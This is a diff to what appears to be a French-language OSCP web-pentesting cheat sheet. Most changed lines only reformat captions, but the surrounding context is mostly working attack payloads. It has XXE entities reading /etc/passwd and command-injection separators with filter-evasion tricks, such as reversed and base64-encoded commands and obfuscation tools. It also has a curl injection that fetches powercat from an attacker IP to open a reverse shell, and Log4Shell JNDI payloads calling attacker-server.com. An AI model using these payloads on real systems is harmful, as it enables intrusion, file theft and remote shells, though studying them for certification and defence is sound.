+<p class="oscp-command-note">Exemple technique pour la rubrique « Identifying ».</p>
 
 ```text
 <date>
@@ -3038,7 +2944,7 @@ Exemple technique pour la rubrique « Identifying ».
 **Entity**
 
 
-Exemple technique pour la rubrique « Identifying ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Identifying ».</p>
 
 ```text
 &lt;
@@ -3048,7 +2954,7 @@ Exemple technique pour la rubrique « Identifying ».
 **Element**
 
 
-Exemple technique pour la rubrique « Identifying ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Identifying ».</p>
 
 ```text
 <date>01-01-2022</date>
@@ -3058,7 +2964,7 @@ Exemple technique pour la rubrique « Identifying ».
 **Attribute**
 
 
-Commande `version` pour la rubrique « Identifying ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil version.</p>
 
 ```text
 version="1.0"/encoding="UTF-8"
@@ -3068,7 +2974,7 @@ version="1.0"/encoding="UTF-8"
 **Declaration**
 
 
-Exemple technique pour la rubrique « Identifying ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Identifying ».</p>
 
 ```text
 <?xml version="1.0" encoding="UTF-8"?>
@@ -3078,7 +2984,7 @@ Exemple technique pour la rubrique « Identifying ».
 ### Local File Disclosure
 
 
-Exemple technique pour la rubrique « Local File Disclosure ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Local File Disclosure ».</p>
 
 ```text
 &[variable];
@@ -3098,7 +3004,7 @@ Exemple technique pour la rubrique « Local File Disclosure ».
 `/etc/passwd`  
 
 
-Exemple technique pour la rubrique « Reading Sensitive Files ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Reading Sensitive Files ».</p>
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -3109,8 +3015,6 @@ Exemple technique pour la rubrique « Reading Sensitive Files ».
 ```
 
 
-Exemple technique pour la rubrique « Reading Sensitive Files ».
-
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE config [
@@ -3120,8 +3024,6 @@ Exemple technique pour la rubrique « Reading Sensitive Files ».
 ```
 
 
-Exemple technique pour la rubrique « Reading Sensitive Files ».
-
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [
@@ -3130,8 +3032,6 @@ Exemple technique pour la rubrique « Reading Sensitive Files ».
 <data>&localHosts;</data>
 ```
 
-
-Exemple technique pour la rubrique « Reading Sensitive Files ».
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -3145,8 +3045,6 @@ Exemple technique pour la rubrique « Reading Sensitive Files ».
 ```
 
 
-Exemple technique pour la rubrique « Reading Sensitive Files ».
-
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE request [
@@ -3159,14 +3057,12 @@ Exemple technique pour la rubrique « Reading Sensitive Files ».
 ### Reading Code source
 
 
-Exemple technique pour la rubrique « Reading Code source ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Reading Code source ».</p>
 
 ```text
 | < > { } &
 ```
 
-
-Exemple technique pour la rubrique « Reading Code source ».
 
 ```xml
 <!DOCTYPE email [
@@ -3180,14 +3076,12 @@ Exemple technique pour la rubrique « Reading Code source ».
 ### Remote Code Execution
 
 
-Exemple technique pour la rubrique « Remote Code Execution ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Remote Code Execution ».</p>
 
 ```text
 | < > { } &
 ```
 
-
-Exemple technique pour la rubrique « Remote Code Execution ».
 
 ```xml
 <?xml version="1.0"?>
@@ -3206,7 +3100,7 @@ Exemple technique pour la rubrique « Remote Code Execution ».
 ### Énumération
 
 
-Exemple technique pour la rubrique « Énumération ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Énumération ».</p>
 
 ```bash
 # UID=1
@@ -3219,7 +3113,7 @@ Exemple technique pour la rubrique « Énumération ».
 ```
 
 
-Commande `url` pour la rubrique « Énumération ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil url.</p>
 
 ```bash
 # Script with regex to find the documents
@@ -3234,8 +3128,6 @@ for i in {1..10}; do
 done
 ```
 
-
-Commande `url` pour la rubrique « Énumération ».
 
 ```bash
 # Alternative script option to find any extension
@@ -3254,7 +3146,7 @@ done
 ### AJAX Calls
 
 
-Commande `function` pour la rubrique « AJAX Calls ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil function.</p>
 
 ```javascript
 // Code Example
@@ -3277,21 +3169,19 @@ function changeUserPassword() {
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-Commande `download.php` pour la rubrique « Hashing & Encoding ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil download.php.</p>
 
 ```text
 download.php?filename=ZmlsZV8xMjMucGRm
 ```
 
 
-Commande `download.php` pour la rubrique « Hashing & Encoding ».
-
 ```text
 download.php?filename=c81e728d9d4c2f636f067f89cc14862c
 ```
 
 
-Exemple technique pour la rubrique « Hashing & Encoding ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Hashing &amp; Encoding ».</p>
 
 ```javascript
 $.ajax({
@@ -3313,7 +3203,7 @@ $.ajax({
 `User2`  
 
 
-Exemple technique pour la rubrique « Compare User Roles ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Compare User Roles ».</p>
 
 ```json
 {
@@ -3331,7 +3221,7 @@ Exemple technique pour la rubrique « Compare User Roles ».
 ### Insecure APIs
 
 
-Exemple technique pour la rubrique « Insecure APIs ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Insecure APIs ».</p>
 
 ```json
 {
@@ -3353,15 +3243,13 @@ Examiner les entrées et les réponses de l'application web.
 ### Identifying
 
 
-Exemple technique pour la rubrique « Identifying ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Identifying ».</p>
 
 ```powershell
 # Check if we are executing PowerShell or CMD
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 ```
 
-
-Exemple technique pour la rubrique « Identifying ».
 
 ```php
 <?php
@@ -3376,7 +3264,7 @@ app.get("/createfile", function(req, res){
 ```
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<ATTACKER_IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<ATTACKER_IP>%20-p%20<PORT>%20-e%20powershell' http://<TARGET>:<PORT>/archive
@@ -3386,7 +3274,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 ### Command Methods
 
 
-Exemple technique pour la rubrique « Command Methods ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Command Methods ».</p>
 
 ```text
 ;
@@ -3396,14 +3284,12 @@ Exemple technique pour la rubrique « Command Methods ».
 **Semicolon**
 
 
-Exemple technique pour la rubrique « Command Methods ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Command Methods ».</p>
 
 ```text
 ;
 ```
 
-
-Exemple technique pour la rubrique « Command Methods ».
 
 ```text
 %3b
@@ -3413,7 +3299,7 @@ Exemple technique pour la rubrique « Command Methods ».
 **New Line**
 
 
-Exemple technique pour la rubrique « Command Methods ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Command Methods ».</p>
 
 ```text
 %0a
@@ -3423,14 +3309,12 @@ Exemple technique pour la rubrique « Command Methods ».
 **Background**
 
 
-Exemple technique pour la rubrique « Command Methods ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Command Methods ».</p>
 
 ```text
 &
 ```
 
-
-Exemple technique pour la rubrique « Command Methods ».
 
 ```text
 %26
@@ -3440,14 +3324,12 @@ Exemple technique pour la rubrique « Command Methods ».
 **Pipe**
 
 
-Exemple technique pour la rubrique « Command Methods ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Command Methods ».</p>
 
 ```text
 |
 ```
 
-
-Exemple technique pour la rubrique « Command Methods ».
 
 ```text
 %7c
@@ -3457,14 +3339,12 @@ Exemple technique pour la rubrique « Command Methods ».
 **AND**
 
 
-Exemple technique pour la rubrique « Command Methods ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Command Methods ».</p>
 
 ```text
 &&
 ```
 
-
-Exemple technique pour la rubrique « Command Methods ».
 
 ```text
 %26%26
@@ -3474,14 +3354,12 @@ Exemple technique pour la rubrique « Command Methods ».
 **OR**
 
 
-Exemple technique pour la rubrique « Command Methods ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Command Methods ».</p>
 
 ```text
 |
 ```
 
-
-Exemple technique pour la rubrique « Command Methods ».
 
 ```text
 %7c%7c
@@ -3491,7 +3369,7 @@ Exemple technique pour la rubrique « Command Methods ».
 **Sub-Shell**
 
 
-Exemple technique pour la rubrique « Command Methods ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Command Methods ».</p>
 
 ```text
 %60%60
@@ -3501,14 +3379,12 @@ Exemple technique pour la rubrique « Command Methods ».
 **Sub-Shell**
 
 
-Exemple technique pour la rubrique « Command Methods ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Command Methods ».</p>
 
 ```text
 $()
 ```
 
-
-Exemple technique pour la rubrique « Command Methods ».
 
 ```text
 %24%28%29
@@ -3518,21 +3394,17 @@ Exemple technique pour la rubrique « Command Methods ».
 #### Space is Blacklisted
 
 
-Exemple technique pour la rubrique « Space is Blacklisted ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Space is Blacklisted ».</p>
 
 ```text
 %09
 ```
 
 
-Exemple technique pour la rubrique « Space is Blacklisted ».
-
 ```text
 $IFS
 ```
 
-
-Exemple technique pour la rubrique « Space is Blacklisted ».
 
 ```json
 {ls,-la}
@@ -3542,7 +3414,7 @@ Exemple technique pour la rubrique « Space is Blacklisted ».
 #### / or \ are Blacklisted
 
 
-Commande `echo` pour la rubrique « / or \ are Blacklisted ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil echo.</p>
 
 ```bash
 # to select /
@@ -3550,7 +3422,7 @@ echo ${PATH:0:1}
 ```
 
 
-Exemple technique pour la rubrique « / or \ are Blacklisted ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « / or \ are Blacklisted ».</p>
 
 ```powershell
 # to select \
@@ -3561,7 +3433,7 @@ $env:HOMEPATH[0]
 #### Commandes are Blacklisted
 
 
-Exemple technique pour la rubrique « Commandes are Blacklisted ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Commandes are Blacklisted ».</p>
 
 ```javascript
 $blacklist = ['whoami', 'cat', ...SNIP...];
@@ -3573,8 +3445,6 @@ foreach ($blacklist as $word) {
 ```
 
 
-Exemple technique pour la rubrique « Commandes are Blacklisted ».
-
 ```text
 ` or "
 
@@ -3582,21 +3452,17 @@ Example: w'h'o'am'i
 ```
 
 
-Exemple technique pour la rubrique « Commandes are Blacklisted ».
-
 ```text
 \
 ```
 
-
-Exemple technique pour la rubrique « Commandes are Blacklisted ».
 
 ```text
 $@
 ```
 
 
-Commande `examples` pour la rubrique « Commandes are Blacklisted ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil examples.</p>
 
 ```text
 Examples:
@@ -3605,14 +3471,14 @@ Examples:
 ```
 
 
-Exemple technique pour la rubrique « Commandes are Blacklisted ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Commandes are Blacklisted ».</p>
 
 ```text
 ^
 ```
 
 
-Commande `example` pour la rubrique « Commandes are Blacklisted ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil example.</p>
 
 ```text
 Example:
@@ -3623,7 +3489,7 @@ Example:
 #### Reverse Commandes
 
 
-Commande `echo` pour la rubrique « Reverse Commandes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil echo.</p>
 
 ```bash
 # Linux
@@ -3634,7 +3500,7 @@ $(rev<<<'imaohw')
 ```
 
 
-Exemple technique pour la rubrique « Reverse Commandes ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Reverse Commandes ».</p>
 
 ```powershell
 # Windows
@@ -3648,7 +3514,7 @@ iex "$('imaohw'[-1..-20] -join '')"
 #### Encoded Commandes
 
 
-Commande `echo` pour la rubrique « Encoded Commandes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil echo.</p>
 
 ```bash
 # Linux
@@ -3659,7 +3525,7 @@ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
 
 
-Exemple technique pour la rubrique « Encoded Commandes ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Encoded Commandes ».</p>
 
 ```powershell
 [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
@@ -3672,7 +3538,7 @@ iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64Str
 ### Automatic Tools
 
 
-Commande `git` pour la rubrique « Automatic Tools ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil git.</p>
 
 ```bash
 # Installation
@@ -3690,8 +3556,6 @@ cd ./bashfuscator/bin/
 ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
 ```
 
-
-Commande `git` pour la rubrique « Automatic Tools ».
 
 ```powershell
 # Installation
@@ -3711,7 +3575,7 @@ Invoke-DOSfuscation\Encoding> 1
 ## Log4Shell
 
 
-Exemple technique pour la rubrique « Log4Shell ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Log4Shell ».</p>
 
 ```bash
 # LDAP Payload
@@ -3722,7 +3586,7 @@ ${jndi:rmi://attacker-server.com:1099/a}
 ```
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 # Using Curl
@@ -3736,14 +3600,14 @@ curl -X POST http://target-server.com/login -d "username=${jndi:ldap://attacker-
 ```
 
 
-Ouvrir un port d'écoute avec Netcat.
+<p class="oscp-command-note">Ouvrir un port d&#x27;écoute avec Netcat.</p>
 
 ```bash
 nc -lvnp [listening_port]
 ```
 
 
-Commande `bash` pour la rubrique « Log4Shell ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil bash.</p>
 
 ```bash
 # You can also use a tool like ysoserial (for Windows) to generate the payload.
@@ -3759,7 +3623,7 @@ ${jndi:ldap://attacker-server.com:1389/bash-reverse-shell}
 ## Exploiting CVEs
 
 
-Commande `cve-2014-6287` pour la rubrique « Exploiting CVEs ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil cve-2014-6287.</p>
 
 ```text
 CVE-2014-6287 https://www.exploit-db.com/exploits/49584 #HFS (HTTP File Server) 2.3.x - Remote Command Execution
